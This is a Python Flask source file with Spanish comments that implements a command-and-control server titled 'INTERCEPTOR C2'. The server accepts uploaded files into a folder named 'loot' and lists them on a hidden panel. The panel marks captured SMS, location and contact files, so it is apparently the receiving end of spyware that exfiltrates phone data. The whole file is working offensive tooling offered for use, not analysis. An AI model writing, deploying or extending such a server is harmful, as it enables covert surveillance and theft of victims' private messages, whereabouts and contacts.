from flask import Flask, request, send_from_directory, render_template_string
import os
import datetime

app = Flask(__name__)
UPLOAD_FOLDER = 'loot'
if not os.path.exists(UPLOAD_FOLDER): os.makedirs(UPLOAD_FOLDER)

@app.route('/svr_upload', methods=['POST'])
def upload():
    if 'file' not in request.files: return "ERR", 400
    file = request.files['file']
    # Guardamos con marca de tiempo para no sobreescribir
    ts = datetime.datetime.now().strftime('%H%M%S')
    filename = f"{ts}_{file.filename}"
    file.save(os.path.join(UPLOAD_FOLDER, filename))
    return "OK", 200

@app.route('/panel-secreto-svr')
def panel():
    files = sorted(os.listdir(UPLOAD_FOLDER), reverse=True)
    li = ""
    for f in files:
        color = "#0f0"
        icon = "📄"
        if "sms" in f.lower(): icon, color = "💬", "#ff00ff"
        if "location" in f.lower(): icon, color = "📍", "#ff0000"
        if "contacts" in f.lower(): icon, color = "👤", "#00ffff"
        
        li += f"<li style='margin:10px 0; border-bottom:1px solid #1a1a1a; padding:5px;'>" \
              f"<span style='color:{color};'>{icon}</span> " \
              f"<a href='/download/{f}' style='color:{color}; text-decoration:none;'>{f}</a></li>"
    
    return f"""
    <html><body style='background:#050505; color:#0f0; font-family:monospace; padding:30px;'>
    <h2 style='text-align:center; border:1px solid #0f0; padding:10px;'>🛰️ SVR-MATRIX: INTERCEPTOR C2</h2>
    <div style='background:#111; padding:20px; border-radius:10px; box-shadow: 0 0 15px #0f03;'>
        <h3>📦 ARCHIVOS CAPTURADOS:</h3>
        <ul style='list-style:none; padding:0;'>{li or '<li>Escaneando frecuencias...</li>'}</ul>
    </div>
    </body></html>
    """

@app.route('/download/<filename>')
def download(filename):
    return send_from_directory(UPLOAD_FOLDER, filename)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
